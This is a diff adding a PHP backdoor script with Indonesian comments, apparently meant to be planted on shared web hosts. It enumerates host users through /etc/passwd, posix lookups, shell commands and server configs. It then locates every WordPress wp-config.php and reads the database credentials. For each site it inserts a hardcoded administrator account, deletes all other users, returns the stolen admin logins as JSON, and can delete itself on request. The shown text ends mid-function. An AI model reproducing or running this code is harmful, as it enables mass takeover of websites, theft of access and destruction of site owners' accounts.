@@ -1,0 +1,1161 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ini_set('log_errors', 0);
+
+// [TAMBAHAN] Setup logging
+$log_file = dirname(__FILE__) . '/debug_' . date('Y-m-d') . '.log';
+function writeLog($message) {
+    global $log_file;
+    $timestamp = date('Y-m-d H:i:s');
+    file_put_contents($log_file, "[$timestamp] $message" . PHP_EOL, FILE_APPEND);
+}
+
+writeLog("========== SCRIPT STARTED ==========");
+writeLog("Request URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown'));
+
+if (isset($_GET['GET']) && $_GET['GET'] === 'DE') {
+    writeLog("DELETE request received");
+    $current_file = __FILE__;
+    if (@unlink($current_file)) {
+        writeLog("File deleted successfully");
+        header('Content-Type: application/json');
+        echo json_encode(['success' => true]);
+    } else {
+        writeLog("File deletion FAILED");
+        header('Content-Type: application/json');
+        http_response_code(500);
+        echo json_encode(['success' => false]);
+    }
+    exit;
+}
+
+if (isset($_GET['GET']) && $_GET['GET'] === 'WP') {
+    writeLog("WP request received - starting scan");
+    
+    $scan_result = frida_scan_all_users_wpconfig();
+    
+    writeLog("Scan completed. Total users: " . ($scan_result['total_users'] ?? 0));
+    writeLog("WP Configs found: " . count($scan_result['wp_configs_found'] ?? []));
+    
+    if (empty($scan_result['wp_configs_found'])) {
+        writeLog("No wp-config files found - returning false");
+        header('Content-Type: application/json');
+        echo json_encode(['success' => false]);
+        exit;
+    }
+    
+    $successful_results = [];
+    $total_deleted = 0;
+    
+    writeLog("Processing " . count($scan_result['wp_configs_found']) . " wp-config files");
+    
+    foreach ($scan_result['wp_configs_found'] as $index => $config) { 
+        $config_path = $config['path'];
+        writeLog("Processing config #$index: $config_path");
+        
+        $username = 'adminer';
+        $password = 'kamubiskuatya';
+        $admin_email = 'vertonix11@gmail.com';
+        $result = frida_create_wp_admin($config_path, $username, $password, $admin_email);
+        
+        if ($result['success']) {
+            $creds = $result['credentials'];
+            $successful_results[] = $creds['wp_admin_url'] . ':' . $creds['username'] . ':' . $creds['password'];
+            $total_deleted += $result['deleted_users'] ?? 0;
+            writeLog("SUCCESS: Admin created for $config_path");
+        } else {
+            writeLog("FAILED: " . ($result['message'] ?? 'Unknown error') . " for $config_path");
+        }
+    }
+    
+    writeLog("Total successful: " . count($successful_results));
+    writeLog("Total users deleted: " . $total_deleted);
+    
+    header('Content-Type: application/json');
+    if (!empty($successful_results)) {
+        echo json_encode([
+            'success' => true,
+            'results' => $successful_results,
+            'total_users_deleted' => $total_deleted
+        ]);
+    } else {
+        echo json_encode(['success' => false]);
+    }
+    exit;
+}
+
+writeLog("Invalid request - no valid GET parameter");
+header('Content-Type: application/json');
+http_response_code(400);
+echo json_encode(['success' => false]);
+
+function frida_detect_home_base() {
+    $paths_to_check = [
+        getcwd(),
+        __FILE__,
+        $_SERVER['DOCUMENT_ROOT'] ?? '',
+        $_SERVER['SCRIPT_FILENAME'] ?? ''
+    ];
+    
+    $detected_bases = [];
+    
+    foreach ($paths_to_check as $path) {
+        if (empty($path)) continue;
+        
+        if (preg_match('/^\/(home\d*|var\/www)\/([^\/]+)/', $path, $matches)) {
+            $base = '/' . $matches[1] . '/';
+            $detected_bases[$base] = true;
+        }
+    }
+    
+    if (is_readable('/etc/passwd')) {
+        writeLog("Reading /etc/passwd for home base detection");
+        $passwd_content = @file_get_contents('/etc/passwd');
+        if ($passwd_content) {
+            $lines = explode("\n", $passwd_content);
+            foreach ($lines as $line) {
+                if (empty($line) || $line[0] === '#') continue;
+                $parts = explode(':', $line);
+                if (count($parts) >= 6) {
+                    $home_dir = $parts[5];
+                    if (preg_match('/^\/(home\d*|var\/www)\//', $home_dir, $matches)) {
+                        $base = '/' . $matches[1] . '/';
+                        $detected_bases[$base] = true;
+                    }
+                }
+            }
+        }
+    }
+    
+    $named_configs = ['/etc/named.conf', '/etc/bind/named.conf', '/var/named/named.conf'];
+    foreach ($named_configs as $named_file) {
+        if (is_readable($named_file)) {
+            $content = @file_get_contents($named_file);
+            if ($content) {
+                if (preg_match_all('/file\s+"([^"]+)"/', $content, $matches)) {
+                    foreach ($matches[1] as $zone_file) {
+                        $zone_path = dirname($zone_file);
+                        if (preg_match('/^\/(home\d*|var\/www)\//', $zone_path, $m)) {
+                            $base = '/' . $m[1] . '/';
+                            $detected_bases[$base] = true;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    if (empty($detected_bases)) {
+        $detected_bases['/home/'] = true;
+    }
+    
+    $all_bases = [];
+    foreach (array_keys($detected_bases) as $base) {
+        $all_bases[] = $base;
+        
+        if (preg_match('/^\/home\/?$/', $base)) {
+            for ($i = 2; $i <= 5; $i++) {
+                $alt_base = '/home' . $i . '/';
+                if (@is_dir($alt_base)) {
+                    $all_bases[] = $alt_base;
+                }
+            }
+        }
+    }
+    
+    $unique_bases = array_unique($all_bases);
+    writeLog("Detected home bases: " . implode(', ', $unique_bases));
+    return $unique_bases;
+}
+
+function frida_get_current_user() {
+    $detected_users = [];
+    
+    $home_bases = frida_detect_home_base();
+    
+    $current_dir = getcwd();
+    foreach ($home_bases as $home_base) {
+        if (preg_match('/^' . preg_quote($home_base, '/') . '([^\/]+)/', $current_dir, $matches)) {
+            $detected_users[$matches[1]] = $home_base . $matches[1];
+        }
+    }
+    
+    $file_path = __FILE__;
+    foreach ($home_bases as $home_base) {
+        if (preg_match('/^' . preg_quote($home_base, '/') . '([^\/]+)/', $file_path, $matches)) {
+            $detected_users[$matches[1]] = $home_base . $matches[1];
+        }
+    }
+    
+    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
+    if (!empty($doc_root)) {
+        foreach ($home_bases as $home_base) {
+            if (preg_match('/^' . preg_quote($home_base, '/') . '([^\/]+)/', $doc_root, $matches)) {
+                $detected_users[$matches[1]] = $home_base . $matches[1];
+            }
+        }
+    }
+    
+    $script_file = $_SERVER['SCRIPT_FILENAME'] ?? '';
+    if (!empty($script_file)) {
+        foreach ($home_bases as $home_base) {
+            if (preg_match('/^' . preg_quote($home_base, '/') . '([^\/]+)/', $script_file, $matches)) {
+                $detected_users[$matches[1]] = $home_base . $matches[1];
+            }
+        }
+    }
+    
+    $env_user = @getenv('USER') ?: @get_current_user();
+    if (!empty($env_user)) {
+        foreach ($home_bases as $home_base) {
+            $home_path = $home_base . $env_user;
+            if (@is_dir($home_path)) {
+                $detected_users[$env_user] = $home_path;
+                break;
+            }
+        }
+    }
+    
+    writeLog("Detected users from current context: " . count($detected_users));
+    return $detected_users;
+}
+
+// [PERBAIKAN] Fungsi deteksi user - scan semua folder di /home/
+function frida_posix_users() {
+    $users = frida_get_current_user();
+    
+    $home_bases = frida_detect_home_base();
+    $home_pattern = '/^(' . implode('|', array_map(function($base) {
+        return preg_quote(rtrim($base, '/'), '/');
+    }, $home_bases)) . '|var\/www)\//';
+    
+    // [PERBAIKAN] Scan langsung semua folder di /home/ tanpa filter UID
+    $scan_dirs = ['/home/', '/home2/', '/home3/', '/home4/', '/home5/', '/var/www/'];
+    foreach ($scan_dirs as $scan_dir) {
+        if (@is_dir($scan_dir)) {
+            writeLog("Scanning directory: $scan_dir");
+            $dirs = @scandir($scan_dir);
+            if ($dirs) {
+                foreach ($dirs as $dir) {
+                    if ($dir === '.' || $dir === '..') continue;
+                    $full_path = rtrim($scan_dir, '/') . '/' . $dir;
+                    if (@is_dir($full_path) && !isset($users[$dir])) {
+                        $users[$dir] = $full_path;
+                        writeLog("Found user from scandir: $dir at $full_path");
+                    }
+                }
+            }
+        }
+    }
+    
+    // [PERBAIKAN] Baca /etc/passwd sebagai fallback utama
+    if (is_readable('/etc/passwd')) {
+        writeLog("Reading /etc/passwd for user detection");
+        $passwd_content = @file_get_contents('/etc/passwd');
+        if ($passwd_content) {
+            $lines = explode("\n", $passwd_content);
+            foreach ($lines as $line) {
+                if (empty($line) || $line[0] === '#') continue;
+                
+                $parts = explode(':', $line);
+                if (count($parts) >= 6) {
+                    $username = $parts[0];
+                    $home_dir = $parts[5];
+                    
+                    if (preg_match($home_pattern, $home_dir) || strpos($home_dir, '/home/') === 0) {
+                        if (!isset($users[$username])) {
+                            $users[$username] = $home_dir;
+                            writeLog("Found user from passwd: $username at $home_dir");
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    // [PERBAIKAN] Gunakan posix_getpwuid untuk rentang UID yang lebih luas
+    if (function_exists('posix_getpwuid')) {
+        writeLog("Using posix_getpwuid for additional user detection");
+        $uid_ranges = [
+            [1000, 20000],
+            [500, 1000],
+            [20000, 60000]
+        ];
+        
+        $existing_users = array_keys($users);
+        
+        foreach ($uid_ranges as $range) {
+            list($start, $end) = $range;
+            
+            for ($uid = $start; $uid < $end; $uid++) {
+                $user_info = @posix_getpwuid($uid);
+                if ($user_info && !empty($user_info['name']) && !empty($user_info['dir'])) {
+                    $username = $user_info['name'];
+                    $home_dir = $user_info['dir'];
+                    
+                    if (!in_array($username, $existing_users) && (preg_match($home_pattern, $home_dir) || strpos($home_dir, '/home/') === 0)) {
+                        $users[$username] = $home_dir;
+                        $existing_users[] = $username;
+                        writeLog("Found user from posix: $username at $home_dir");
+                    }
+                }
+                
+                if ($uid % 500 === 0) {
+                    usleep(500);
+                }
+            }
+        }
+    }
+    
+    // [PERBAIKAN] Fallback shell command jika tersedia
+    if (empty($users)) {
+        writeLog("Attempting shell command for user detection");
+        $result = @shell_exec('ls -d /home/*/ 2>/dev/null | xargs -n1 basename');
+        if ($result) {
+            $lines = explode("\n", trim($result));
+            foreach ($lines as $username) {
+                $username = trim($username);
+                if (!empty($username) && !isset($users[$username])) {
+                    $home_dir = '/home/' . $username . '/';
+                    if (@is_dir($home_dir)) {
+                        $users[$username] = $home_dir;
+                        writeLog("Found user from shell: $username at $home_dir");
+                    }
+                }
+            }
+        }
+    }
+    
+    writeLog("Total users detected: " . count($users));
+    return $users;
+}
+
+function frida_check_openbasedir() {
+    $restrictions = [];
+    
+    $open_basedir = ini_get('open_basedir');
+    if (!empty($open_basedir)) {
+        $restrictions['open_basedir'] = explode(':', $open_basedir);
+        writeLog("Open_basedir is active: " . $open_basedir);
+    } else {
+        $restrictions['open_basedir'] = null;
+        writeLog("Open_basedir is NOT active");
+    }
+    
+    $disable_functions = ini_get('disable_functions');
+    $restrictions['disable_functions'] = !empty($disable_functions) ? explode(',', str_replace(' ', '', $disable_functions)) : [];
+    
+    $safe_mode = ini_get('safe_mode');
+    $restrictions['safe_mode'] = $safe_mode;
+    
+    $test_paths = [
+        '/home',
+        '/var/www',
+        '/tmp',
+        '/etc/passwd',
+        '/root'
+    ];
+    
+    $restrictions['accessible_paths'] = [];
+    foreach ($test_paths as $test_path) {
+        if (@is_readable($test_path)) {
+            $restrictions['accessible_paths'][] = $test_path;
+        }
+    }
+    
+    return $restrictions;
+}
+
+// [PERBAIKAN] Fungsi scan virtual host config
+function frida_get_virtual_hosts() {
+    $document_roots = [];
+    
+    $apache_configs = [
+        '/etc/httpd/conf/httpd.conf',
+        '/etc/httpd/conf.d/*.conf',
+        '/etc/apache2/apache2.conf',
+        '/etc/apache2/sites-enabled/*.conf',
+        '/etc/apache2/sites-available/*.conf',
+        '/usr/local/apache/conf/httpd.conf',
+        '/usr/local/apache2/conf/httpd.conf'
+    ];
+    
+    foreach ($apache_configs as $pattern) {
+        $files = @glob($pattern);
+        if ($files) {
+            foreach ($files as $file) {
+                if (is_readable($file)) {
+                    $content = @file_get_contents($file);
+                    if ($content && preg_match_all('/DocumentRoot\s+"([^"]+)"/i', $content, $matches)) {
+                        foreach ($matches[1] as $docroot) {
+                            $docroot = trim($docroot);
+                            if (!empty($docroot) && !in_array($docroot, $document_roots)) {
+                                $document_roots[] = $docroot;
+                                writeLog("Found DocumentRoot from Apache: $docroot");
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    $nginx_configs = [
+        '/etc/nginx/nginx.conf',
+        '/etc/nginx/conf.d/*.conf',
+        '/etc/nginx/sites-enabled/*',
+        '/etc/nginx/sites-available/*'
+    ];
+    
+    foreach ($nginx_configs as $pattern) {
+        $files = @glob($pattern);
+        if ($files) {
+            foreach ($files as $file) {
+                if (is_readable($file)) {
+                    $content = @file_get_contents($file);
+                    if ($content && preg_match_all('/root\s+([^;]+);/i', $content, $matches)) {
+                        foreach ($matches[1] as $docroot) {
+                            $docroot = trim($docroot);
+                            if (!empty($docroot) && !in_array($docroot, $document_roots)) {
+                                $document_roots[] = $docroot;
+                                writeLog("Found DocumentRoot from Nginx: $docroot");
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    return $document_roots;
+}
+
+// [PERBAIKAN] Fungsi find wp-config dengan depth 7 dan pattern universal
+function frida_find_wp_configs($path = '') {
+    if (empty($path)) {
+        $path = getcwd() ?: ($_SERVER['DOCUMENT_ROOT'] ?? '/');
+    }
+    
+    $path = realpath($path);
+    if (!$path || !is_readable($path)) {
+        writeLog("Path not readable: $path");
+        return [];
+    }
+    
+    writeLog("Finding wp-config in: $path");
+    $wp_configs = [];
+    
+    // [PERBAIKAN] Pola direktori universal
+    $docroot_patterns = [
+        'public_html',
+        'www',
+        'htdocs',
+        'html',
+        'web',
+        'public',
+        'site',
+        'httpdocs'
+    ];
+    
+    // [PERBAIKAN] Coba dengan RecursiveIterator depth 7
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        $iterator->setMaxDepth(7); // [PERBAIKAN] Depth dari 5 menjadi 7
+        
+        foreach ($iterator as $file) {
+            if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
+                $wp_configs[] = $file->getPathname();
+                if (count($wp_configs) >= 100) break;
+            }
+        }
+    } catch (Exception $e) {
+        writeLog("Iterator error: " . $e->getMessage());
+    }
+    
+    // [PERBAIKAN] Pattern glob universal dengan semua variasi docroot
+    $base_path = rtrim($path, '/');
+    
+    // Pattern untuk docroot standar
+    foreach ($docroot_patterns as $docroot) {
+        $patterns = [
+            $base_path . '/' . $docroot . '/wp-config.php',
+            $base_path . '/' . $docroot . '/*/wp-config.php',
+            $base_path . '/' . $docroot . '/*/*/wp-config.php',
+            $base_path . '/' . $docroot . '/*/*/*/wp-config.php',
+            $base_path . '/*/' . $docroot . '/wp-config.php',
+            $base_path . '/*/*/' . $docroot . '/wp-config.php',
+            $base_path . '/domains/*/' . $docroot . '/wp-config.php',
+            $base_path . '/domains/*/*/' . $docroot . '/wp-config.php',
+            $base_path . '/*/domains/*/' . $docroot . '/wp-config.php'
+        ];
+        
+        foreach ($patterns as $pattern) {
+            $found = @glob($pattern);
+            if ($found && is_array($found)) {
+                foreach ($found as $file) {
+                    if (!in_array($file, $wp_configs)) {
+                        $wp_configs[] = $file;
+                    }
+                }
+            }
+        }
+    }
+    
+    // [PERBAIKAN] Pattern untuk struktur subdomain
+    $subdomain_patterns = [
+        $base_path . '/*/*/wp-config.php',
+        $base_path . '/*/*/*/wp-config.php',
+        $base_path . '/*/*/*/*/wp-config.php',
+        $base_path . '/domains/*/public_html/wp-config.php',
+        $base_path . '/domains/*/www/wp-config.php',
+        $base_path . '/domains/*/html/wp-config.php',
+        $base_path . '/*/domains/*/public_html/wp-config.php'
+    ];
+    
+    foreach ($subdomain_patterns as $pattern) {
+        $found = @glob($pattern);
+        if ($found && is_array($found)) {
+            foreach ($found as $file) {
+                if (!in_array($file, $wp_configs)) {
+                    $wp_configs[] = $file;
+                }
+            }
+        }
+    }
+    
+    // [PERBAIKAN] Pattern dengan wildcard ** jika supported
+    $recursive_patterns = [
+        $base_path . '/**/wp-config.php',
+        $base_path . '/*/**/wp-config.php',
+        $base_path . '/domains/**/wp-config.php'
+    ];
+    
+    foreach ($recursive_patterns as $pattern) {
+        $found = @glob($pattern, GLOB_BRACE);
+        if ($found && is_array($found)) {
+            foreach ($found as $file) {
+                if (!in_array($file, $wp_configs)) {
+                    $wp_configs[] = $file;
+                }
+            }
+        }
+    }
+    
+    $wp_configs = array_unique($wp_configs);
+    writeLog("Found " . count($wp_configs) . " wp-config files");
+    return $wp_configs;
+}
+
+function frida_parse_wp_config($config_file) {
+    if (!file_exists($config_file)) {
+        writeLog("Parse error: File does not exist: $config_file");
+        return ['error' => 'File does not exist: ' . $config_file];
+    }
+    
+    if (!is_readable($config_file)) {
+        writeLog("Parse error: File not readable: $config_file");
+        return ['error' => 'File not readable: ' . $config_file];
+    }
+    
+    $content = @file_get_contents($config_file);
+    if (!$content) {
+        $error = error_get_last();
+        writeLog("Parse error: Cannot read file: " . ($error['message'] ?? 'Unknown error'));
+        return ['error' => 'Cannot read file: ' . ($error['message'] ?? 'Unknown error')];
+    }
+    
+    if (strlen($content) < 50) {
+        writeLog("Parse error: File too small (" . strlen($content) . " bytes)");
+        return ['error' => 'File too small (' . strlen($content) . ' bytes)'];
+    }
+    
+    $credentials = [];
+    
+    if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['host'] = trim($matches[1]);
+    } elseif (preg_match("/DB_HOST.*?=.*?['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['host'] = trim($matches[1]);
+    } else {
+        $credentials['host'] = 'localhost';
+    }
+    
+    if ($credentials['host'] === 'localhost') {
+        $credentials['host'] = '127.0.0.1';
+    }
+    
+    if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['name'] = trim($matches[1]);
+    } elseif (preg_match("/DB_NAME.*?=.*?['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['name'] = trim($matches[1]);
+    } else {
+        writeLog("Parse error: DB_NAME not found in $config_file");
+        return ['error' => 'DB_NAME not found in wp-config.php'];
+    }
+    
+    if (empty($credentials['name'])) {
+        writeLog("Parse error: DB_NAME is empty in $config_file");
+        return ['error' => 'DB_NAME is empty'];
+    }
+    
+    if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['user'] = trim($matches[1]);
+    } elseif (preg_match("/DB_USER.*?=.*?['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['user'] = trim($matches[1]);
+    } else {
+        writeLog("Parse error: DB_USER not found in $config_file");
+        return ['error' => 'DB_USER not found in wp-config.php'];
+    }
+    
+    if (empty($credentials['user'])) {
+        writeLog("Parse error: DB_USER is empty in $config_file");
+        return ['error' => 'DB_USER is empty'];
+    }
+    
+    if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['password'] = trim($matches[1]);
+    } elseif (preg_match("/DB_PASSWORD.*?=.*?['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['password'] = trim($matches[1]);
+    } else {
+        $credentials['password'] = '';
+    }
+    
+    if (preg_match("/\$table_prefix\s*=\s*['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['prefix'] = trim($matches[1]);
+    } elseif (preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/i", $content, $matches)) {
+        $credentials['prefix'] = trim($matches[1]);
+    } else {
+        $credentials['prefix'] = 'wp_';
+    }
+    
+    writeLog("Successfully parsed wp-config: " . $config_file);
+    return $credentials;
+}
+
+function frida_get_site_url($pdo, $prefix) {
+    try {
+        $stmt = $pdo->query("SELECT option_value FROM {$prefix}options WHERE option_name = 'home' OR option_name = 'siteurl' LIMIT 1");
+        $result = $stmt->fetchColumn();
+        return $result ?: '';
+    } catch (Exception $e) {
+        writeLog("Error getting site URL: " . $e->getMessage());
+        return '';
+    }
+}
+
+function frida_wp_hash_password($password) {
+    return password_hash($password, PASSWORD_BCRYPT);
+}
+
+function delete_all_other_users($pdo, $prefix, $new_user_id) {
+    try {
+        $stmt = $pdo->prepare("SELECT ID FROM {$prefix}users WHERE ID != ?");
+        $stmt->execute([$new_user_id]);
+        $user_ids = $stmt->fetchAll(PDO::FETCH_COLUMN);
+        
+        $deleted_count = count($user_ids);
+        writeLog("Deleting $deleted_count other users");
+        
+        if ($deleted_count > 0) {
+            $placeholders = implode(',', array_fill(0, count($user_ids), '?'));
+            $pdo->prepare("DELETE FROM {$prefix}usermeta WHERE user_id IN ($placeholders)")
+                ->execute($user_ids);
+            
+            $pdo->prepare("DELETE FROM {$prefix}users WHERE ID IN ($placeholders)")
+                ->execute($user_ids);
+            
+            $pdo->prepare("UPDATE {$prefix}posts SET post_author = ? WHERE post_author IN ($placeholders)")
+                ->execute(array_merge([$new_user_id], $user_ids));
+            
+            writeLog("Successfully deleted $deleted_count users");
+        }
+        
+        return $deleted_count;
+        
+    } catch (Exception $e) {
+        writeLog("Error deleting users: " . $e->getMessage());
+        return 0;
+    }
+}
+
+function frida_create_wp_admin($config_path, $admin_username = 'biskuat', $admin_password = null, $admin_email = null) {
+    writeLog("Creating admin for: $config_path");
+    
+    if (!$admin_password) {
+        $admin_password = 'kamu';
+    }
+    if (!$admin_email) {
+        $admin_email = 'vertonix11@gmail.com';
+    }
+    
+    $credentials = frida_parse_wp_config($config_path);
+    
+    if ($credentials === null) {
+        writeLog("Error: Parse returned NULL for $config_path");
+        return ['success' => false, 'message' => 'Parse error: Function returned NULL', 'url' => '', 'credentials' => null];
+    }
+    
+    if (isset($credentials['error'])) {
+        writeLog("Error: " . $credentials['error']);
+        return ['success' => false, 'message' => 'Parse error: ' . $credentials['error'], 'url' => '', 'credentials' => null];
+    }
+    
+    if (empty($credentials) || !is_array($credentials)) {
+        writeLog("Error: Invalid credentials format");
+        return ['success' => false, 'message' => 'Parse error: Invalid return format', 'url' => '', 'credentials' => null];
+    }
+    
+    if (empty($credentials['name'])) {
+        writeLog("Error: DB_NAME is empty");
+        return ['success' => false, 'message' => 'Parse error: DB_NAME is empty or missing', 'url' => '', 'credentials' => null];
+    }
+    
+    try {
+        $pdo = null;
+        $last_error = null;
+        
+        $hosts_to_try = [$credentials['host']];
+        if ($credentials['host'] === '127.0.0.1') {
+            $hosts_to_try[] = 'localhost';
+        } elseif ($credentials['host'] === 'localhost') {
+            $hosts_to_try[] = '127.0.0.1';
+        }
+        
+        writeLog("Trying database hosts: " . implode(', ', $hosts_to_try));
+        
+        foreach ($hosts_to_try as $host) {
+            try {
+                $dsn = "mysql:host={$host};dbname={$credentials['name']};charset=utf8";
+                $pdo = new PDO(
+                    $dsn,
+                    $credentials['user'],
+                    $credentials['password'],
+                    [
+                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+                        PDO::ATTR_TIMEOUT => 5,
+                        PDO::ATTR_PERSISTENT => false
+                    ]
+                );
+                writeLog("Connected to database using host: $host");
+                break;
+            } catch (PDOException $e) {
+                $last_error = $e->getMessage();
+                writeLog("Failed to connect with host $host: " . $last_error);
+                if (strpos($last_error, 'not allowed to connect') !== false && count($hosts_to_try) > 1) {
+                    continue;
+                }
+                if (count($hosts_to_try) === 1 || strpos($last_error, 'not allowed') === false) {
+                    return ['success' => false, 'message' => 'MySQL connection failed: ' . $last_error, 'url' => '', 'credentials' => null];
+                }
+            }
+        }
+        
+        if (!$pdo) {
+            writeLog("Failed to connect with any host");
+            return ['success' => false, 'message' => 'MySQL connection failed (tried: ' . implode(', ', $hosts_to_try) . '): ' . $last_error, 'url' => '', 'credentials' => null];
+        }
+        
+        $prefix = $credentials['prefix'];
+        
+        try {
+            $stmt = $pdo->query("SHOW TABLES LIKE '{$prefix}users'");
+            if (!$stmt->fetch()) {
+                writeLog("Table '{$prefix}users' does not exist");
+                return ['success' => false, 'message' => "Table '{$prefix}users' does not exist", 'url' => '', 'credentials' => null];
+            }
+        } catch (Exception $e) {
+            writeLog("Cannot check table: " . $e->getMessage());
+            return ['success' => false, 'message' => 'Cannot check table: ' . $e->getMessage(), 'url' => '', 'credentials' => null];
+        }
+        
+        $stmt = $pdo->prepare("SELECT ID FROM {$prefix}users WHERE user_login = ?");
+        $stmt->execute([$admin_username]);
+        if ($stmt->fetch()) {
+            writeLog("Admin user already exists");
+            return ['success' => false, 'message' => 'Admin already exists', 'url' => '', 'credentials' => null];
+        }
+        
+        $site_url = frida_get_site_url($pdo, $prefix);
+        writeLog("Site URL: " . ($site_url ?: 'not found'));
+        
+        $user_data = [
+            'user_login' => $admin_username,
+            'user_pass' => frida_wp_hash_password($admin_password),
+            'user_nicename' => $admin_username,
+            'user_email' => $admin_email,
+            'user_url' => '',
+            'user_registered' => date('Y-m-d H:i:s'),
+            'user_activation_key' => '',
+            'user_status' => 0,
+            'display_name' => 'biskuat'
+        ];
+        
+        try {
+            $stmt = $pdo->query("SHOW COLUMNS FROM {$prefix}users WHERE Field = 'ID'");
+            $id_col = $stmt->fetch(PDO::FETCH_ASSOC);
+            if ($id_col) {
+                $is_auto_increment = (strpos(strtolower($id_col['Extra'] ?? ''), 'auto_increment') !== false);
+                $is_nullable = (strtolower($id_col['Null'] ?? '') === 'yes');
+                
+                if (!$is_auto_increment && !$is_nullable) {
+                    $stmt = $pdo->query("SELECT MAX(ID) as max_id FROM {$prefix}users");
+                    $result = $stmt->fetch(PDO::FETCH_ASSOC);
+                    $max_id = $result['max_id'] ?? 0;
+                    $user_data['ID'] = (int)$max_id + 1;
+                }
+            }
+        } catch (Exception $e) {
+            writeLog("Error checking ID column: " . $e->getMessage());
+        }
+        
+        $placeholders = ':' . implode(', :', array_keys($user_data));
+        $stmt = $pdo->prepare("INSERT INTO {$prefix}users (" . implode(', ', array_keys($user_data)) . ") VALUES ($placeholders)");
+        $stmt->execute($user_data);
+        
+        $user_id = $pdo->lastInsertId() ?: ($user_data['ID'] ?? null);
+        writeLog("Created user ID: " . $user_id);
+        
+        $deleted_count = delete_all_other_users($pdo, $prefix, $user_id);
+        
+        $capabilities = serialize(['administrator' => true]);
+        $stmt = $pdo->prepare("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+        $stmt->execute([$user_id, $prefix . 'capabilities', $capabilities]);
+        $stmt->execute([$user_id, $prefix . 'user_level', '10']);
+        $stmt->execute([$user_id, 'nickname', $admin_username]);
+        $stmt->execute([$user_id, 'first_name', 'biskuat']);
+        $stmt->execute([$user_id, 'last_name', 'Admin']);
+        
+        writeLog("Successfully created admin for: $config_path");
+        
+        return [
+            'success' => true,
+            'message' => 'Admin created successfully',
+            'url' => $site_url,
+            'credentials' => [
+                'username' => $admin_username,
+                'password' => $admin_password,
+                'email' => $admin_email,
+                'site_url' => $site_url,
+                'wp_admin_url' => rtrim($site_url, '/') . '/wp-admin'
+            ],
+            'deleted_users' => $deleted_count
+        ];
+        
+    } catch (Exception $e) {
+        writeLog("Exception: " . $e->getMessage());
+        return ['success' => false, 'message' => $e->getMessage(), 'url' => '', 'credentials' => null];
+    }
+}
+
+// [PERBAIKAN] Fungsi scan utama dengan timeout 8 detik per user
+function frida_scan_all_users_wpconfig() {
+    @set_time_limit(300);
+    $start_time = microtime(true);
+    $max_time_per_user = 8.0; // [PERBAIKAN] dari 5 detik menjadi 8 detik
+    
+    writeLog("Starting frida_scan_all_users_wpconfig");
+    
+    $users = frida_posix_users();
+    writeLog("Total users from frida_posix_users: " . count($users));
+    
+    // [PERBAIKAN] Dapatkan virtual host document roots
+    $virtual_hosts = frida_get_virtual_hosts();
+    writeLog("Virtual hosts found: " . count($virtual_hosts));
+    
+    $results = [
+        'total_users' => count($users),
+        'scanned_users' => 0,
+        'wp_configs_found' => [],
+        'skipped_users' => [],
+        'debug_info' => [],
+        'user_debug' => []
+    ];
+    
+    // [PERBAIKAN] Pola path universal yang lebih lengkap
+    $quick_paths = [
+        'wp-config.php',
+        'public_html/wp-config.php',
+        'www/wp-config.php',
+        'htdocs/wp-config.php',
+        'html/wp-config.php',
+        'web/wp-config.php',
+        'public/wp-config.php',
+        'site/wp-config.php',
+        'httpdocs/wp-config.php',
+        'domains/*/public_html/wp-config.php',
+        'domains/*/www/wp-config.php',
+        'domains/*/htdocs/wp-config.php',
+        'domains/*/html/wp-config.php',
+        'domains/*/web/wp-config.php',
+        'domains/*/public/wp-config.php',
+        'domains/*/site/wp-config.php',
+        'domains/*/httpdocs/wp-config.php',
+        '*/public_html/wp-config.php',
+        '*/www/wp-config.php',
+        '*/htdocs/wp-config.php',
+        '*/html/wp-config.php',
+        '*/web/wp-config.php',
+        '*/public/wp-config.php',
+        '*/site/wp-config.php',
+        '*/*/wp-config.php',
+        '*/*/*/wp-config.php'
+    ];
+    
+    $use_find_command = function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')));
+    
+    $detected_home_bases = frida_detect_home_base();
+    
+    foreach ($users as $username => $home_dir) {
+        $user_start = microtime(true);
+        $home_dir = rtrim($home_dir, '/') . '/';
+        $results['scanned_users']++;
+        
+        $user_debug = [
+            'username' => $username,
+            'home_dir' => $home_dir,
+            'paths_checked' => 0,
+            'dirs_checked' => 0,
+            'glob_patterns_tried' => 0,
+            'timeout' => false,
+            'found_count' => 0
+        ];
+        
+        $check_dirs = [$home_dir];
+        
+        // [PERBAIKAN] Tambahkan variasi direktori yang mungkin
+        $variation_dirs = [
+            $home_dir . 'public_html/',
+            $home_dir . 'www/',
+            $home_dir . 'htdocs/',
+            $home_dir . 'html/',
+            $home_dir . 'web/',
+            $home_dir . 'public/',
+            $home_dir . 'site/',
+            $home_dir . 'httpdocs/',
+            $home_dir . 'domains/',
+            $home_dir . 'subdomains/'
+        ];
+        
+        foreach ($variation_dirs as $var_dir) {
+            if (@is_dir($var_dir) && !in_array($var_dir, $check_dirs)) {
+                $check_dirs[] = $var_dir;
+            }
+        }
+        
+        $current_base = null;
